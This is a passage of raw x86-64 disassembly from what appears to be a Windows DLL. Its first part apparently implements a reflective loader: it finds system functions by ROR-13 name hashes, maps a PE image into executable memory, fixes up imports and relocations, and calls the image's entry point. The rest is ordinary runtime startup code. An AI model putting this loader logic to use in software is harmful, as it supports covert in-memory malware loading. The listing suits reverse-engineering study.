   180001ddb:	3d 5b bc 4a 6a       	cmp    $0x6a4abc5b,%eax
   180001de0:	0f 85 c4 00 00 00    	jne    0x180001eaa
   180001de6:	4d 8b 4e 20          	mov    0x20(%r14),%r9
   180001dea:	bd ff ff 00 00       	mov    $0xffff,%ebp
   180001def:	49 63 41 3c          	movslq 0x3c(%r9),%rax
   180001df3:	42 8b bc 08 88 00 00 	mov    0x88(%rax,%r9,1),%edi
   180001dfa:	00 
   180001dfb:	46 8b 54 0f 20       	mov    0x20(%rdi,%r9,1),%r10d
   180001e00:	46 8b 5c 0f 24       	mov    0x24(%rdi,%r9,1),%r11d
   180001e05:	4d 03 d1             	add    %r9,%r10
   180001e08:	4d 03 d9             	add    %r9,%r11
   180001e0b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001e10:	41 8b 0a             	mov    (%r10),%ecx
   180001e13:	49 03 c9             	add    %r9,%rcx
   180001e16:	45 33 c0             	xor    %r8d,%r8d
   180001e19:	0f b6 01             	movzbl (%rcx),%eax
   180001e1c:	0f 1f 40 00          	nopl   0x0(%rax)
   180001e20:	41 c1 c8 0d          	ror    $0xd,%r8d
   180001e24:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   180001e28:	0f be c0             	movsbl %al,%eax
   180001e2b:	44 03 c0             	add    %eax,%r8d
   180001e2e:	0f b6 01             	movzbl (%rcx),%eax
   180001e31:	84 c0                	test   %al,%al
   180001e33:	75 eb                	jne    0x180001e20
   180001e35:	41 81 f8 8e 4e 0e ec 	cmp    $0xec0e4e8e,%r8d
   180001e3c:	74 12                	je     0x180001e50
   180001e3e:	41 81 f8 aa fc 0d 7c 	cmp    $0x7c0dfcaa,%r8d
   180001e45:	74 09                	je     0x180001e50
   180001e47:	41 81 f8 54 ca af 91 	cmp    $0x91afca54,%r8d
   180001e4e:	75 42                	jne    0x180001e92
   180001e50:	42 8b 4c 0f 1c       	mov    0x1c(%rdi,%r9,1),%ecx
   180001e55:	41 0f b7 13          	movzwl (%r11),%edx
   180001e59:	49 03 c9             	add    %r9,%rcx
   180001e5c:	41 81 f8 8e 4e 0e ec 	cmp    $0xec0e4e8e,%r8d
   180001e63:	75 09                	jne    0x180001e6e
   180001e65:	44 8b 2c 91          	mov    (%rcx,%rdx,4),%r13d
   180001e69:	4d 03 e9             	add    %r9,%r13
   180001e6c:	eb 21                	jmp    0x180001e8f
   180001e6e:	41 81 f8 aa fc 0d 7c 	cmp    $0x7c0dfcaa,%r8d
   180001e75:	75 09                	jne    0x180001e80
   180001e77:	44 8b 24 91          	mov    (%rcx,%rdx,4),%r12d
   180001e7b:	4d 03 e1             	add    %r9,%r12
   180001e7e:	eb 0f                	jmp    0x180001e8f
   180001e80:	41 81 f8 54 ca af 91 	cmp    $0x91afca54,%r8d
   180001e87:	75 06                	jne    0x180001e8f
   180001e89:	8b 34 91             	mov    (%rcx,%rdx,4),%esi
   180001e8c:	49 03 f1             	add    %r9,%rsi
   180001e8f:	66 03 dd             	add    %bp,%bx
   180001e92:	49 83 c2 04          	add    $0x4,%r10
   180001e96:	49 83 c3 02          	add    $0x2,%r11
   180001e9a:	66 85 db             	test   %bx,%bx
   180001e9d:	0f 85 6d ff ff ff    	jne    0x180001e10
   180001ea3:	8b fd                	mov    %ebp,%edi
   180001ea5:	e9 8b 00 00 00       	jmp    0x180001f35
   180001eaa:	3d 5d 68 fa 3c       	cmp    $0x3cfa685d,%eax
   180001eaf:	0f 85 8a 00 00 00    	jne    0x180001f3f
   180001eb5:	4d 8b 56 20          	mov    0x20(%r14),%r10
   180001eb9:	49 63 42 3c          	movslq 0x3c(%r10),%rax
   180001ebd:	42 8b 9c 10 88 00 00 	mov    0x88(%rax,%r10,1),%ebx
   180001ec4:	00 
   180001ec5:	46 8b 44 13 20       	mov    0x20(%rbx,%r10,1),%r8d
   180001eca:	46 8b 4c 13 24       	mov    0x24(%rbx,%r10,1),%r9d
   180001ecf:	4d 03 c2             	add    %r10,%r8
   180001ed2:	4d 03 ca             	add    %r10,%r9
   180001ed5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   180001edc:	00 00 00 00 
   180001ee0:	41 8b 10             	mov    (%r8),%edx
   180001ee3:	49 03 d2             	add    %r10,%rdx
   180001ee6:	33 c9                	xor    %ecx,%ecx
   180001ee8:	0f b6 02             	movzbl (%rdx),%eax
   180001eeb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180001ef0:	c1 c9 0d             	ror    $0xd,%ecx
   180001ef3:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   180001ef7:	0f be c0             	movsbl %al,%eax
   180001efa:	03 c8                	add    %eax,%ecx
   180001efc:	0f b6 02             	movzbl (%rdx),%eax
   180001eff:	84 c0                	test   %al,%al
   180001f01:	75 ed                	jne    0x180001ef0
   180001f03:	81 f9 b8 0a 4c 53    	cmp    $0x534c0ab8,%ecx
   180001f09:	75 17                	jne    0x180001f22
   180001f0b:	42 8b 4c 13 1c       	mov    0x1c(%rbx,%r10,1),%ecx
   180001f10:	41 0f b7 11          	movzwl (%r9),%edx
   180001f14:	49 03 ca             	add    %r10,%rcx
   180001f17:	44 8b 3c 91          	mov    (%rcx,%rdx,4),%r15d
   180001f1b:	4d 03 fa             	add    %r10,%r15
   180001f1e:	66 44 03 df          	add    %di,%r11w
   180001f22:	49 83 c0 04          	add    $0x4,%r8
   180001f26:	49 83 c1 02          	add    $0x2,%r9
   180001f2a:	66 45 85 db          	test   %r11w,%r11w
   180001f2e:	75 b0                	jne    0x180001ee0
   180001f30:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   180001f35:	41 bb 01 00 00 00    	mov    $0x1,%r11d
   180001f3b:	41 8d 5b 02          	lea    0x2(%r11),%ebx
   180001f3f:	4d 85 ed             	test   %r13,%r13
   180001f42:	74 0f                	je     0x180001f53
   180001f44:	4d 85 e4             	test   %r12,%r12
   180001f47:	74 0a                	je     0x180001f53
   180001f49:	48 85 f6             	test   %rsi,%rsi
   180001f4c:	74 05                	je     0x180001f53
   180001f4e:	4d 85 ff             	test   %r15,%r15
   180001f51:	75 0c                	jne    0x180001f5f
   180001f53:	4d 8b 36             	mov    (%r14),%r14
   180001f56:	4d 85 f6             	test   %r14,%r14
   180001f59:	0f 85 51 fe ff ff    	jne    0x180001db0
   180001f5f:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   180001f64:	4c 63 7d 3c          	movslq 0x3c(%rbp),%r15
   180001f68:	33 c9                	xor    %ecx,%ecx
   180001f6a:	4c 03 fd             	add    %rbp,%r15
   180001f6d:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   180001f73:	44 8d 49 40          	lea    0x40(%rcx),%r9d
   180001f77:	41 8b 57 50          	mov    0x50(%r15),%edx
   180001f7b:	ff d6                	call   *%rsi
   180001f7d:	4c 8b f0             	mov    %rax,%r14
   180001f80:	48 8b d5             	mov    %rbp,%rdx
   180001f83:	41 8b 47 54          	mov    0x54(%r15),%eax
   180001f87:	48 85 c0             	test   %rax,%rax
   180001f8a:	74 24                	je     0x180001fb0
   180001f8c:	4d 8b c6             	mov    %r14,%r8
   180001f8f:	4c 2b c5             	sub    %rbp,%r8
   180001f92:	0f 1f 40 00          	nopl   0x0(%rax)
   180001f96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180001f9d:	00 00 00 
   180001fa0:	0f b6 0a             	movzbl (%rdx),%ecx
   180001fa3:	41 88 0c 10          	mov    %cl,(%r8,%rdx,1)
   180001fa7:	48 ff c2             	inc    %rdx
   180001faa:	48 83 e8 01          	sub    $0x1,%rax
   180001fae:	75 f0                	jne    0x180001fa0
   180001fb0:	45 0f b7 4f 14       	movzwl 0x14(%r15),%r9d
   180001fb5:	45 0f b7 57 06       	movzwl 0x6(%r15),%r10d
   180001fba:	49 83 c1 2c          	add    $0x2c,%r9
   180001fbe:	4d 85 d2             	test   %r10,%r10
   180001fc1:	74 48                	je     0x18000200b
   180001fc3:	4d 03 cf             	add    %r15,%r9
   180001fc6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   180001fcd:	00 00 00 
   180001fd0:	41 8b 49 f8          	mov    -0x8(%r9),%ecx
   180001fd4:	49 ff ca             	dec    %r10
   180001fd7:	41 8b 11             	mov    (%r9),%edx
   180001fda:	49 03 ce             	add    %r14,%rcx
   180001fdd:	45 8b 41 fc          	mov    -0x4(%r9),%r8d
   180001fe1:	48 03 d5             	add    %rbp,%rdx
   180001fe4:	4d 85 c0             	test   %r8,%r8
   180001fe7:	74 19                	je     0x180002002
   180001fe9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180001ff0:	0f b6 02             	movzbl (%rdx),%eax
   180001ff3:	48 ff c2             	inc    %rdx
   180001ff6:	88 01                	mov    %al,(%rcx)
   180001ff8:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   180001ffc:	49 83 e8 01          	sub    $0x1,%r8
   180002000:	75 ee                	jne    0x180001ff0
   180002002:	49 83 c1 28          	add    $0x28,%r9
   180002006:	4d 85 d2             	test   %r10,%r10
   180002009:	75 c5                	jne    0x180001fd0
   18000200b:	41 8b af 90 00 00 00 	mov    0x90(%r15),%ebp
   180002012:	49 03 ee             	add    %r14,%rbp
   180002015:	8b 45 0c             	mov    0xc(%rbp),%eax
   180002018:	85 c0                	test   %eax,%eax
   18000201a:	0f 84 8b 00 00 00    	je     0x1800020ab
   180002020:	8b c8                	mov    %eax,%ecx
   180002022:	49 03 ce             	add    %r14,%rcx
   180002025:	41 ff d5             	call   *%r13
   180002028:	8b 7d 10             	mov    0x10(%rbp),%edi
   18000202b:	48 8b f0             	mov    %rax,%rsi
   18000202e:	8b 5d 00             	mov    0x0(%rbp),%ebx
   180002031:	49 03 fe             	add    %r14,%rdi
   180002034:	49 03 de             	add    %r14,%rbx
   180002037:	48 83 3f 00          	cmpq   $0x0,(%rdi)
   18000203b:	74 5f                	je     0x18000209c
   18000203d:	0f 1f 00             	nopl   (%rax)
   180002040:	48 85 db             	test   %rbx,%rbx
   180002043:	74 2c                	je     0x180002071
   180002045:	48 8b 13             	mov    (%rbx),%rdx
   180002048:	48 85 d2             	test   %rdx,%rdx
   18000204b:	79 24                	jns    0x180002071
   18000204d:	48 63 46 3c          	movslq 0x3c(%rsi),%rax
   180002051:	0f b7 d2             	movzwl %dx,%edx
   180002054:	8b 8c 30 88 00 00 00 	mov    0x88(%rax,%rsi,1),%ecx
   18000205b:	8b 44 31 10          	mov    0x10(%rcx,%rsi,1),%eax
   18000205f:	8b 4c 31 1c          	mov    0x1c(%rcx,%rsi,1),%ecx
   180002063:	48 2b d0             	sub    %rax,%rdx
   180002066:	48 03 ce             	add    %rsi,%rcx
   180002069:	8b 04 91             	mov    (%rcx,%rdx,4),%eax
   18000206c:	48 03 c6             	add    %rsi,%rax
   18000206f:	eb 10                	jmp    0x180002081
   180002071:	48 8b 17             	mov    (%rdi),%rdx
   180002074:	48 8b ce             	mov    %rsi,%rcx
   180002077:	48 83 c2 02          	add    $0x2,%rdx
   18000207b:	49 03 d6             	add    %r14,%rdx
   18000207e:	41 ff d4             	call   *%r12
   180002081:	48 89 07             	mov    %rax,(%rdi)
   180002084:	48 83 c7 08          	add    $0x8,%rdi
   180002088:	48 85 db             	test   %rbx,%rbx
   18000208b:	48 8d 43 08          	lea    0x8(%rbx),%rax
   18000208f:	48 0f 44 c3          	cmove  %rbx,%rax
   180002093:	48 83 3f 00          	cmpq   $0x0,(%rdi)
   180002097:	48 8b d8             	mov    %rax,%rbx
   18000209a:	75 a4                	jne    0x180002040
   18000209c:	8b 45 20             	mov    0x20(%rbp),%eax
   18000209f:	48 83 c5 14          	add    $0x14,%rbp
   1800020a3:	85 c0                	test   %eax,%eax
   1800020a5:	0f 85 75 ff ff ff    	jne    0x180002020
   1800020ab:	4c 8b 6c 24 20       	mov    0x20(%rsp),%r13
   1800020b0:	4d 8b ce             	mov    %r14,%r9
   1800020b3:	4d 2b 4f 30          	sub    0x30(%r15),%r9
   1800020b7:	41 83 bf b4 00 00 00 	cmpl   $0x0,0xb4(%r15)
   1800020be:	00 
   1800020bf:	4c 8b 64 24 28       	mov    0x28(%rsp),%r12
   1800020c4:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   1800020c9:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1800020ce:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   1800020d3:	0f 84 b8 00 00 00    	je     0x180002191
   1800020d9:	41 8b 9f b0 00 00 00 	mov    0xb0(%r15),%ebx
   1800020e0:	49 03 de             	add    %r14,%rbx
   1800020e3:	8b 43 04             	mov    0x4(%rbx),%eax
   1800020e6:	85 c0                	test   %eax,%eax
   1800020e8:	0f 84 a3 00 00 00    	je     0x180002191
   1800020ee:	66 90                	xchg   %ax,%ax
   1800020f0:	44 8b 03             	mov    (%rbx),%r8d
   1800020f3:	4c 8d 5b 08          	lea    0x8(%rbx),%r11
   1800020f7:	44 8b d0             	mov    %eax,%r10d
   1800020fa:	4d 03 c6             	add    %r14,%r8
   1800020fd:	49 83 ea 08          	sub    $0x8,%r10
   180002101:	49 d1 ea             	shr    $1,%r10
   180002104:	74 7d                	je     0x180002183
   180002106:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   18000210d:	00 00 00 
   180002110:	41 0f b7 13          	movzwl (%r11),%edx
   180002114:	49 ff ca             	dec    %r10
   180002117:	0f b7 ca             	movzwl %dx,%ecx
   18000211a:	0f b7 c2             	movzwl %dx,%eax
   18000211d:	66 c1 e9 0c          	shr    $0xc,%cx
   180002121:	66 83 f9 0a          	cmp    $0xa,%cx
   180002125:	75 14                	jne    0x18000213b
   180002127:	81 e2 ff 0f 00 00    	and    $0xfff,%edx
   18000212d:	4a 8b 04 02          	mov    (%rdx,%r8,1),%rax
   180002131:	49 8d 0c 01          	lea    (%r9,%rax,1),%rcx
   180002135:	4a 89 0c 02          	mov    %rcx,(%rdx,%r8,1)
   180002139:	eb 3c                	jmp    0x180002177
   18000213b:	66 83 f9 03          	cmp    $0x3,%cx
   18000213f:	75 0b                	jne    0x18000214c
   180002141:	25 ff 0f 00 00       	and    $0xfff,%eax
   180002146:	46 01 0c 00          	add    %r9d,(%rax,%r8,1)
   18000214a:	eb 2b                	jmp    0x180002177
   18000214c:	66 83 f9 01          	cmp    $0x1,%cx
   180002150:	75 15                	jne    0x180002167
   180002152:	25 ff 0f 00 00       	and    $0xfff,%eax
   180002157:	4a 8d 0c 00          	lea    (%rax,%r8,1),%rcx
   18000215b:	49 8b c1             	mov    %r9,%rax
   18000215e:	48 c1 e8 10          	shr    $0x10,%rax
   180002162:	66 01 01             	add    %ax,(%rcx)
   180002165:	eb 10                	jmp    0x180002177
   180002167:	66 83 f9 02          	cmp    $0x2,%cx
   18000216b:	75 0a                	jne    0x180002177
   18000216d:	25 ff 0f 00 00       	and    $0xfff,%eax
   180002172:	66 46 01 0c 00       	add    %r9w,(%rax,%r8,1)
   180002177:	49 83 c3 02          	add    $0x2,%r11
   18000217b:	4d 85 d2             	test   %r10,%r10
   18000217e:	75 90                	jne    0x180002110
   180002180:	8b 43 04             	mov    0x4(%rbx),%eax
   180002183:	48 03 d8             	add    %rax,%rbx
   180002186:	8b 43 04             	mov    0x4(%rbx),%eax
   180002189:	85 c0                	test   %eax,%eax
   18000218b:	0f 85 5f ff ff ff    	jne    0x1800020f0
   180002191:	41 8b 5f 28          	mov    0x28(%r15),%ebx
   180002195:	33 d2                	xor    %edx,%edx
   180002197:	45 33 c0             	xor    %r8d,%r8d
   18000219a:	49 03 de             	add    %r14,%rbx
   18000219d:	48 8d 4a ff          	lea    -0x1(%rdx),%rcx
   1800021a1:	ff 54 24 70          	call   *0x70(%rsp)
   1800021a5:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   1800021aa:	ba 01 00 00 00       	mov    $0x1,%edx
   1800021af:	49 8b ce             	mov    %r14,%rcx
   1800021b2:	ff d3                	call   *%rbx
   1800021b4:	48 8b c3             	mov    %rbx,%rax
   1800021b7:	48 83 c4 40          	add    $0x40,%rsp
   1800021bb:	41 5f                	pop    %r15
   1800021bd:	41 5e                	pop    %r14
   1800021bf:	5b                   	pop    %rbx
   1800021c0:	c3                   	ret
   1800021c1:	cc                   	int3
   1800021c2:	cc                   	int3
   1800021c3:	cc                   	int3
   1800021c4:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   1800021c9:	48 8d 05 b0 61 01 00 	lea    0x161b0(%rip),%rax        # 0x180018380
   1800021d0:	48 89 41 08          	mov    %rax,0x8(%rcx)
   1800021d4:	48 8d 05 95 61 01 00 	lea    0x16195(%rip),%rax        # 0x180018370
   1800021db:	48 89 01             	mov    %rax,(%rcx)
   1800021de:	48 8b c1             	mov    %rcx,%rax
   1800021e1:	c3                   	ret
   1800021e2:	cc                   	int3
   1800021e3:	cc                   	int3
   1800021e4:	40 53                	rex push %rbx
   1800021e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800021ea:	48 8b d9             	mov    %rcx,%rbx
   1800021ed:	48 8b c2             	mov    %rdx,%rax
   1800021f0:	48 8d 0d 61 61 01 00 	lea    0x16161(%rip),%rcx        # 0x180018358
   1800021f7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1800021fa:	48 89 0b             	mov    %rcx,(%rbx)
   1800021fd:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002201:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002205:	0f 11 02             	movups %xmm0,(%rdx)
   180002208:	e8 4b 15 00 00       	call   0x180003758
   18000220d:	48 8d 05 9c 61 01 00 	lea    0x1619c(%rip),%rax        # 0x1800183b0
   180002214:	48 89 03             	mov    %rax,(%rbx)
   180002217:	48 8b c3             	mov    %rbx,%rax
   18000221a:	48 83 c4 20          	add    $0x20,%rsp
   18000221e:	5b                   	pop    %rbx
   18000221f:	c3                   	ret
   180002220:	40 53                	rex push %rbx
   180002222:	48 83 ec 30          	sub    $0x30,%rsp
   180002226:	48 8b d9             	mov    %rcx,%rbx
   180002229:	c6 44 24 28 01       	movb   $0x1,0x28(%rsp)
   18000222e:	48 8b c2             	mov    %rdx,%rax
   180002231:	48 8d 0d 20 61 01 00 	lea    0x16120(%rip),%rcx        # 0x180018358
   180002238:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000223b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180002240:	48 89 0b             	mov    %rcx,(%rbx)
   180002243:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002247:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000224c:	0f 11 02             	movups %xmm0,(%rdx)
   18000224f:	e8 04 15 00 00       	call   0x180003758
   180002254:	48 8d 05 55 61 01 00 	lea    0x16155(%rip),%rax        # 0x1800183b0
   18000225b:	48 89 03             	mov    %rax,(%rbx)
   18000225e:	48 8b c3             	mov    %rbx,%rax
   180002261:	48 83 c4 30          	add    $0x30,%rsp
   180002265:	5b                   	pop    %rbx
   180002266:	c3                   	ret
   180002267:	cc                   	int3
   180002268:	40 53                	rex push %rbx
   18000226a:	48 83 ec 20          	sub    $0x20,%rsp
   18000226e:	48 8b d9             	mov    %rcx,%rbx
   180002271:	48 8b c2             	mov    %rdx,%rax
   180002274:	48 8d 0d dd 60 01 00 	lea    0x160dd(%rip),%rcx        # 0x180018358
   18000227b:	0f 57 c0             	xorps  %xmm0,%xmm0
   18000227e:	48 89 0b             	mov    %rcx,(%rbx)
   180002281:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   180002285:	48 8d 48 08          	lea    0x8(%rax),%rcx
   180002289:	0f 11 02             	movups %xmm0,(%rdx)
   18000228c:	e8 c7 14 00 00       	call   0x180003758
   180002291:	48 8d 05 00 61 01 00 	lea    0x16100(%rip),%rax        # 0x180018398
   180002298:	48 89 03             	mov    %rax,(%rbx)
   18000229b:	48 8b c3             	mov    %rbx,%rax
   18000229e:	48 83 c4 20          	add    $0x20,%rsp
   1800022a2:	5b                   	pop    %rbx
   1800022a3:	c3                   	ret
   1800022a4:	48 83 ec 48          	sub    $0x48,%rsp
   1800022a8:	48 8b d1             	mov    %rcx,%rdx
   1800022ab:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800022b0:	e8 6b ff ff ff       	call   0x180002220
   1800022b5:	48 8d 15 64 ff 01 00 	lea    0x1ff64(%rip),%rdx        # 0x180022220
   1800022bc:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1800022c1:	e8 86 16 00 00       	call   0x18000394c
   1800022c6:	cc                   	int3
   1800022c7:	cc                   	int3
   1800022c8:	cc                   	int3
   1800022c9:	cc                   	int3
   1800022ca:	cc                   	int3
   1800022cb:	cc                   	int3
   1800022cc:	cc                   	int3
   1800022cd:	cc                   	int3
   1800022ce:	cc                   	int3
   1800022cf:	cc                   	int3
   1800022d0:	cc                   	int3
   1800022d1:	cc                   	int3
   1800022d2:	cc                   	int3
   1800022d3:	cc                   	int3
   1800022d4:	cc                   	int3
   1800022d5:	cc                   	int3
   1800022d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1800022dd:	00 00 00 
   1800022e0:	48 3b 0d 29 0d 02 00 	cmp    0x20d29(%rip),%rcx        # 0x180023010
   1800022e7:	f2 75 12             	bnd jne 0x1800022fc
   1800022ea:	48 c1 c1 10          	rol    $0x10,%rcx
   1800022ee:	66 f7 c1 ff ff       	test   $0xffff,%cx
   1800022f3:	f2 75 02             	bnd jne 0x1800022f8
   1800022f6:	f2 c3                	bnd ret
   1800022f8:	48 c1 c9 10          	ror    $0x10,%rcx
   1800022fc:	e9 8f 07 00 00       	jmp    0x180002a90
   180002301:	cc                   	int3
   180002302:	cc                   	int3
   180002303:	cc                   	int3
   180002304:	e9 ef 09 00 00       	jmp    0x180002cf8
   180002309:	cc                   	int3
   18000230a:	cc                   	int3
   18000230b:	cc                   	int3
   18000230c:	40 53                	rex push %rbx
   18000230e:	48 83 ec 20          	sub    $0x20,%rsp
   180002312:	48 8b d9             	mov    %rcx,%rbx
   180002315:	eb 0f                	jmp    0x180002326
   180002317:	48 8b cb             	mov    %rbx,%rcx
   18000231a:	e8 7d 89 00 00       	call   0x18000ac9c
   18000231f:	85 c0                	test   %eax,%eax
   180002321:	74 13                	je     0x180002336
   180002323:	48 8b cb             	mov    %rbx,%rcx
   180002326:	e8 e1 89 00 00       	call   0x18000ad0c
   18000232b:	48 85 c0             	test   %rax,%rax
   18000232e:	74 e7                	je     0x180002317
   180002330:	48 83 c4 20          	add    $0x20,%rsp
   180002334:	5b                   	pop    %rbx
   180002335:	c3                   	ret
   180002336:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   18000233a:	74 06                	je     0x180002342
   18000233c:	e8 bf 09 00 00       	call   0x180002d00
   180002341:	cc                   	int3
   180002342:	e8 09 ef ff ff       	call   0x180001250
   180002347:	cc                   	int3
   180002348:	48 83 ec 28          	sub    $0x28,%rsp
   18000234c:	e8 7b 0b 00 00       	call   0x180002ecc
   180002351:	85 c0                	test   %eax,%eax
   180002353:	74 21                	je     0x180002376
   180002355:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   18000235c:	00 00 
   18000235e:	48 8b 48 08          	mov    0x8(%rax),%rcx
   180002362:	eb 05                	jmp    0x180002369
   180002364:	48 3b c8             	cmp    %rax,%rcx
   180002367:	74 14                	je     0x18000237d
   180002369:	33 c0                	xor    %eax,%eax
   18000236b:	f0 48 0f b1 0d 44 18 	lock cmpxchg %rcx,0x21844(%rip)        # 0x180023bb8
   180002372:	02 00 
   180002374:	75 ee                	jne    0x180002364
   180002376:	32 c0                	xor    %al,%al
   180002378:	48 83 c4 28          	add    $0x28,%rsp
   18000237c:	c3                   	ret
   18000237d:	b0 01                	mov    $0x1,%al
   18000237f:	eb f7                	jmp    0x180002378
   180002381:	cc                   	int3
   180002382:	cc                   	int3
   180002383:	cc                   	int3
   180002384:	48 83 ec 28          	sub    $0x28,%rsp
   180002388:	e8 3f 0b 00 00       	call   0x180002ecc
   18000238d:	85 c0                	test   %eax,%eax
   18000238f:	74 07                	je     0x180002398
   180002391:	e8 8a 09 00 00       	call   0x180002d20
   180002396:	eb 19                	jmp    0x1800023b1
   180002398:	e8 27 0b 00 00       	call   0x180002ec4
   18000239d:	8b c8                	mov    %eax,%ecx
   18000239f:	e8 f4 8f 00 00       	call   0x18000b398
   1800023a4:	85 c0                	test   %eax,%eax
   1800023a6:	74 04                	je     0x1800023ac
   1800023a8:	32 c0                	xor    %al,%al
   1800023aa:	eb 07                	jmp    0x1800023b3
   1800023ac:	e8 b3 93 00 00       	call   0x18000b764
   1800023b1:	b0 01                	mov    $0x1,%al
   1800023b3:	48 83 c4 28          	add    $0x28,%rsp
   1800023b7:	c3                   	ret
   1800023b8:	48 83 ec 28          	sub    $0x28,%rsp
   1800023bc:	33 c9                	xor    %ecx,%ecx
   1800023be:	e8 3d 01 00 00       	call   0x180002500
   1800023c3:	84 c0                	test   %al,%al
   1800023c5:	0f 95 c0             	setne  %al
   1800023c8:	48 83 c4 28          	add    $0x28,%rsp
   1800023cc:	c3                   	ret
   1800023cd:	cc                   	int3
   1800023ce:	cc                   	int3
   1800023cf:	cc                   	int3
   1800023d0:	48 83 ec 28          	sub    $0x28,%rsp
   1800023d4:	e8 3b 16 00 00       	call   0x180003a14
   1800023d9:	84 c0                	test   %al,%al
   1800023db:	75 04                	jne    0x1800023e1
   1800023dd:	32 c0                	xor    %al,%al
   1800023df:	eb 12                	jmp    0x1800023f3
   1800023e1:	e8 d6 98 00 00       	call   0x18000bcbc
   1800023e6:	84 c0                	test   %al,%al
   1800023e8:	75 07                	jne    0x1800023f1
   1800023ea:	e8 39 16 00 00       	call   0x180003a28
   1800023ef:	eb ec                	jmp    0x1800023dd
   1800023f1:	b0 01                	mov    $0x1,%al
   1800023f3:	48 83 c4 28          	add    $0x28,%rsp
   1800023f7:	c3                   	ret
   1800023f8:	48 83 ec 28          	sub    $0x28,%rsp
   1800023fc:	e8 cf 98 00 00       	call   0x18000bcd0
   180002401:	e8 22 16 00 00       	call   0x180003a28
   180002406:	b0 01                	mov    $0x1,%al
   180002408:	48 83 c4 28          	add    $0x28,%rsp
   18000240c:	c3                   	ret
   18000240d:	cc                   	int3
   18000240e:	cc                   	int3
   18000240f:	cc                   	int3
   180002410:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180002415:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   18000241a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000241f:	57                   	push   %rdi
   180002420:	48 83 ec 20          	sub    $0x20,%rsp
   180002424:	49 8b f9             	mov    %r9,%rdi
   180002427:	49 8b f0             	mov    %r8,%rsi
   18000242a:	8b da                	mov    %edx,%ebx
   18000242c:	48 8b e9             	mov    %rcx,%rbp
   18000242f:	e8 98 0a 00 00       	call   0x180002ecc
   180002434:	85 c0                	test   %eax,%eax
   180002436:	75 16                	jne    0x18000244e
   180002438:	83 fb 01             	cmp    $0x1,%ebx
   18000243b:	75 11                	jne    0x18000244e
   18000243d:	4c 8b c6             	mov    %rsi,%r8
   180002440:	33 d2                	xor    %edx,%edx
   180002442:	48 8b cd             	mov    %rbp,%rcx
   180002445:	48 8b c7             	mov    %rdi,%rax
   180002448:	ff 15 62 5e 01 00    	call   *0x15e62(%rip)        # 0x1800182b0
   18000244e:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   180002453:	8b 4c 24 50          	mov    0x50(%rsp),%ecx
   180002457:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   18000245c:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   180002461:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   180002466:	48 83 c4 20          	add    $0x20,%rsp
   18000246a:	5f                   	pop    %rdi
   18000246b:	e9 a4 88 00 00       	jmp    0x18000ad14
   180002470:	48 83 ec 28          	sub    $0x28,%rsp
   180002474:	e8 53 0a 00 00       	call   0x180002ecc
   180002479:	85 c0                	test   %eax,%eax
   18000247b:	74 10                	je     0x18000248d
   18000247d:	48 8d 0d 44 17 02 00 	lea    0x21744(%rip),%rcx        # 0x180023bc8
   180002484:	48 83 c4 28          	add    $0x28,%rsp
   180002488:	e9 37 96 00 00       	jmp    0x18000bac4
   18000248d:	e8 de 8c 00 00       	call   0x18000b170
   180002492:	85 c0                	test   %eax,%eax
   180002494:	75 05                	jne    0x18000249b
   180002496:	e8 b9 8c 00 00       	call   0x18000b154
   18000249b:	48 83 c4 28          	add    $0x28,%rsp
   18000249f:	c3                   	ret
   1800024a0:	48 83 ec 28          	sub    $0x28,%rsp
   1800024a4:	33 c9                	xor    %ecx,%ecx
   1800024a6:	e8 6d 98 00 00       	call   0x18000bd18
   1800024ab:	48 83 c4 28          	add    $0x28,%rsp
   1800024af:	e9 a4 15 00 00       	jmp    0x180003a58
   1800024b4:	40 53                	rex push %rbx
   1800024b6:	48 83 ec 20          	sub    $0x20,%rsp
   1800024ba:	0f b6 05 ff 16 02 00 	movzbl 0x216ff(%rip),%eax        # 0x180023bc0
   1800024c1:	85 c9                	test   %ecx,%ecx
   1800024c3:	bb 01 00 00 00       	mov    $0x1,%ebx
   1800024c8:	0f 44 c3             	cmove  %ebx,%eax
   1800024cb:	88 05 ef 16 02 00    	mov    %al,0x216ef(%rip)        # 0x180023bc0
   1800024d1:	e8 4a 08 00 00       	call   0x180002d20
   1800024d6:	e8 11 15 00 00       	call   0x1800039ec
   1800024db:	84 c0                	test   %al,%al
